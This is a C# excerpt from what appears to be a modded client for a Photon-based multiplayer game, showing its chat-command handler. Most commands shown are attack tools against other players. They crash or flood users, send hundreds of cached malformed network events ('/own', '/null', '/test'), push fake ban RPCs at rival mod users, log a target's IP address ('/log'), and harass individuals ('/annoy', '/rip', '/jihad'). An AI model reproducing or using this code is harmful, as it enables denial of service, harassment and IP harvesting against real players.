        ...
        if ((Event.current.type == EventType.KeyDown) && ((Event.current.keyCode == KeyCode.KeypadEnter) || (Event.current.keyCode == KeyCode.Return)))
        {
            if (!string.IsNullOrEmpty(this.inputLine))
            {
                ...
                if (!this.inputLine.StartsWith("/"))
                {
                    ...
                    if (GlobalVars.Bools[27])
                    {
                        string reversestring = string.Empty;
                        char[] stringchar = this.inputLine.ToCharArray();
                        for (int i = 0; i < stringchar.Length; i++)
                        {
                            reversestring = string.Concat(reversestring + stringchar[stringchar.Length - 1 - i]);
                        }
                        reversestring = string.Concat(reversestring + " : " + str2);

                        //object[] parameters = new object[] { this.inputLine, str2 };
                        object[] parameters = new object[] { reversestring, string.Empty };
                        FengGameManagerMKII.instance.photonView.RPC("Chat", PhotonTargets.All, parameters);
                    }
                    else if (GlobalVars.Bools[28]) // k im not gonna use regex.
                    {
                        /*this.inputLine = this.inputLine.ToUpper();*/
                        this.inputLine = this.inputLine.Replace('S', '$').Replace('s', '$').Replace('E', 'X').Replace('e', 'x').Replace('A', 'V').Replace('a', 'v');

//                         string rebuiltstring = string.Empty;
//                         char[] stringchar = this.inputLine.ToUpper().ToCharArray();
//                         for (int i = 0; i < stringchar.Length; i++)
//                         {
//                             
//                             if (stringchar[i] == 'A')
//                             { string.Concat(reversestring + " : " + str2);rebuiltstring  }
//                             else if (stringchar[i] == 'E')
//                             { }
//                             else if (stringchar[i] == 'S')
//                             { }
//                             else
//                             { }
//                             //reversestring = string.Concat(reversestring + stringchar[stringchar.Length - 1 - i]);
//                         }
                ...
                else
                {
                    ...
                    else if (this.inputLine.StartsWith("/image"))
                    {
                        string[] strArray = this.inputLine.Split(new char[] { ' ' });
                        FengGameManagerMKII.instance.StartCoroutine(FengGameManagerMKII.instance.chat_image_generator(strArray[1]));
                    }
                    else if (this.inputLine.StartsWith("/emote"))
                    {
                        string[] strArray = this.inputLine.Split(new char[] { ' ' });
                        string file = "E:/emotes/" + strArray[1] + ".png";
                        if (File.Exists(file))
                            FengGameManagerMKII.instance.StartCoroutine(FengGameManagerMKII.instance.chat_image_generator("file:/" + file));
                    }
                    ...
                    else if (this.inputLine == "/loli")
                    {
                        string Loli = "<size=6>\n<color=#6EFF3D>▓▓</color><color=#3DCFFF>░░░░</color> <color=#6EFF3D>▓</color><color=#3DCFFF>░░░░░</color><color=#6EFF3D>▓</color><color=#3DCFFF>░</color>\n<color=#6EFF3D>▓▓</color><color=#3DCFFF>░░░░ ░</color><color=#6EFF3D>▓</color><color=#3DCFFF>░</color><color=#6EFF3D>▓</color><color=#3DCFFF>░</color><color=#6EFF3D>▓</color><color=#3DCFFF>░░</color>\n<color=#6EFF3D>▓▓</color><color=#3DCFFF>░░░░ ░░</color><color=#6EFF3D>▓</color><color=#3DCFFF>░</color><color=#6EFF3D>▓</color><color=#3DCFFF>░░░</color>\n<color=#6EFF3D>▓▓▓▓▓▓</color><color=#3DCFFF> ░</color><color=#6EFF3D>▓▓▓▓▓▓</color><color=#3DCFFF>░</color>\n<color=#3DCFFF>░</color><color=#6EFF3D>▓▓▓▓</color><color=#3DCFFF>░ ░░░</color><color=#6EFF3D>▓▓</color><color=#3DCFFF>░░░</color>\n<color=#6EFF3D>▓▓</color><color=#3DCFFF>░░</color><color=#6EFF3D>▓▓ </color><color=#3DCFFF>░░░</color><color=#6EFF3D>▓▓</color><color=#3DCFFF>░░░</color>\n<color=#6EFF3D>▓▓</color><color=#3DCFFF>░░</color><color=#6EFF3D>▓▓ </color><color=#3DCFFF>░</color><color=#6EFF3D>▓▓▓▓▓▓</color><color=#3DCFFF>░</color>\n<color=#3DCFFF>░</color><color=#6EFF3D>▓▓▓▓</color><color=#3DCFFF>░ ░</color><color=#6EFF3D>▓</color><color=#3DCFFF>░░░░</color><color=#6EFF3D>▓</color><color=#3DCFFF>░</color>\n<color=#6EFF3D>▓▓</color><color=#3DCFFF>░░░░ ░</color><color=#6EFF3D>▓</color><color=#3DCFFF>░</color><color=#6EFF3D>▓</color><color=#3DCFFF>░░</color><color=#6EFF3D>▓</color><color=#3DCFFF>░</color>\n<color=#6EFF3D>▓▓</color><color=#3DCFFF>░░░░ ░</color><color=#6EFF3D>▓</color><color=#3DCFFF>░░</color><color=#6EFF3D>▓</color><color=#3DCFFF>░</color><color=#6EFF3D>▓</color><color=#3DCFFF>░</color>\n<color=#6EFF3D>▓▓</color><color=#3DCFFF>░░░░ ░</color><color=#6EFF3D>▓</color><color=#3DCFFF>░░░░</color><color=#6EFF3D>▓</color><color=#3DCFFF>░</color>\n<color=#6EFF3D>▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓</color>\n<color=#6EFF3D>▓▓▓▓▓▓ ▓▓</color><color=#3DCFFF>░░░░░░</color>\n<color=#3DCFFF>░░</color><color=#6EFF3D>▓▓</color><color=#3DCFFF>░░ </color><color=#6EFF3D>▓▓▓▓▓▓▓▓</color>\n<color=#3DCFFF>░░</color><color=#6EFF3D>▓▓</color><color=#3DCFFF>░░ ░░░░░░</color><color=#6EFF3D>▓▓</color>\n<color=#6EFF3D>▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓</color></size>";
                        object[] loliobj = new object[] { Loli, "" };
                        FengGameManagerMKII.instance.photonView.RPC("Chat", PhotonTargets.All, loliobj);
                    }
                    else if (this.inputLine == "/scoreall")
                    {
                        FengGameManagerMKII.instance.scoreboardAll();
                    }
                    else if (this.inputLine == "/score")
                    {
                        FengGameManagerMKII.instance.scoreboardPlayer(Convert.ToInt32(this.inputLine.Substring(7)));
                    }
                    else if (this.inputLine == "/annoy")
                    {
                        FengGameManagerMKII.instance.bannoy = true;
                        FengGameManagerMKII.instance.idtoannoy = Convert.ToInt32(this.inputLine.Substring(6));
                    }
                    else if (this.inputLine == "/stopannoy")
                    {
                        FengGameManagerMKII.instance.bannoy = false;
                    }
                    else if (this.inputLine == "/crash")
                    {
                        FengGameManagerMKII.instance.FloodAllUsers();
                    }
                    else if (this.inputLine == "/flood")
                    {
                        FengGameManagerMKII.instance.FloodUser();
                    }
                    else if (this.inputLine.StartsWith("/ec"))
                    {
                        PhotonPlayer Target = null;
                        int num3 = Convert.ToInt32(this.inputLine.Substring(4));
                        foreach (PhotonPlayer ayylmao in PhotonNetwork.playerList)
                        {
                            if (ayylmao.ID == num3)
                                Target = ayylmao;
                        }
                        UnityEngine.Debug.Log("Trying to ban EC user ID:" + num3);
                        object[] parameters2 = new object[] { Target, "d340" };
                        base.photonView.RPC("SkinCheck", Target, parameters2);
                    }
                    else if (this.inputLine.StartsWith("/ecall"))
                    {
                        List<PhotonPlayer> ayylmao = new List<PhotonPlayer>();
                        foreach (PhotonPlayer pPhotonplayer in PhotonNetwork.playerList)
                        {
                            if (pPhotonplayer.customProperties.ContainsKey("not null"))
                            {
                                ayylmao.Add(pPhotonplayer);
                            }
                        }

                        foreach (PhotonPlayer TargetPlayer in ayylmao)
                        {
                            UnityEngine.Debug.Log("Trying to ban ECALL user ID:" + TargetPlayer.ID);
                            object[] parameters2 = new object[] { TargetPlayer, "d340" };
                            base.photonView.RPC("SkinCheck", TargetPlayer, parameters2);
                        }
                    }
                    else if (this.inputLine.StartsWith("/touche"))
                    {
                        int num3 = Convert.ToInt32(this.inputLine.Substring(8));
                        FengGameManagerMKII.instance.spamTitanKill(num3);
                    }
                    else if(this.inputLine.StartsWith("/log"))
                    {
                        string[] strArray = this.inputLine.Split(new char[] { ' ' });
                        int ID = Convert.ToInt32(strArray[1]);
                        HERO.MyPlayer.logip(ID);
                    }
                    else if (this.inputLine.StartsWith("/own"))
                    {
                        string[] strArray = this.inputLine.Split(new char[] { ' ' });
                        int Target = Convert.ToInt32(strArray[1]);
                        ExitGames.Client.Photon.Hashtable customEventContent = new ExitGames.Client.Photon.Hashtable();
                        customEventContent[(byte)0] = "redCross1";
                        customEventContent[(byte)1] = new Vector3(4.20f, 0.9001f, 9.11f);
                        customEventContent[(byte)6] = (int)PhotonNetwork.time;
                        customEventContent[(byte)7] = 2;
                        RaiseEventOptions raiseEventOptions = new RaiseEventOptions
                        {
                            CachingOption = ExitGames.Client.Photon.Lite.EventCaching.AddToRoomCacheGlobal
                        };
                     /*   raiseEventOptions.TargetActors = new int[] { Target };*/
                        for(int i = 0; i < 300; i++)
                        {
                            PhotonNetwork.networkingPeer.OpRaiseEvent(0xca, customEventContent, true, raiseEventOptions);
                        }
                    }
                    else if (this.inputLine.StartsWith("/test"))
                    {
                        int num3 = Convert.ToInt32(this.inputLine.Substring(6));
                        RaiseEventOptions options = new RaiseEventOptions();
                        options.TargetActors = new int[] { num3 };
                        PhotonNetwork.networkingPeer.OpRaiseFakeEvent(0xcb, null, true, options);
                        //FengGameManagerMKII.instance.StartCoroutine(PhotonNetwork.networkingPeer.AbuseMoveData(num3));
                    }
                    else if (this.inputLine.StartsWith("/null"))
                    {
//                         int num3 = Convert.ToInt32(this.inputLine.Substring(6));
//                         ExitGames.Client.Photon.Hashtable evData = new ExitGames.Client.Photon.Hashtable();
//                         evData[(byte)0] = int.MaxValue;//"redCross1";
//                         evData[(byte)1] = short.MaxValue;
//                         /*evData[(byte)3] = 0;*/
//                         evData[(byte)6] = (int)PhotonNetwork.time;
//                         evData[(byte)7] = 2;
// 
//                         RaiseEventOptions opt = new RaiseEventOptions();
//                         opt.TargetActors = new int[] { num3 };
//                         PhotonNetwork.networkingPeer.OpRaiseEvent(0xca, evData, true, opt);

                        int num3 = Convert.ToInt32(this.inputLine.Substring(6));
                        ExitGames.Client.Photon.Hashtable evData = new ExitGames.Client.Photon.Hashtable();
                        evData[(byte)0] = "hook";//"redCross1";
                        evData[(byte)3] = 0;
                        evData[(byte)6] = (int)PhotonNetwork.time;
                        evData[(byte)7] = 2;
                    ...
                    else if (this.inputLine.StartsWith("/rip"))
                    {
                        int num3 = Convert.ToInt32(this.inputLine.Substring(5));
                        FengGameManagerMKII.instance.ripuser(num3);
                    }
                    else if (this.inputLine.StartsWith("/deleteslb"))
                    {
                        int num3 = Convert.ToInt32(this.inputLine.Substring(11));
                        FengGameManagerMKII.instance.photonView.RPC("OnPhotonPlayerConneected", PhotonPlayer.Find(num3), new object[0]);
                    }
                    else if (this.inputLine.StartsWith("/jihad"))
                    {
                        int num3 = Convert.ToInt32(this.inputLine.Substring(7));
                        FengGameManagerMKII.instance.JihadSLB(num3);
                    }
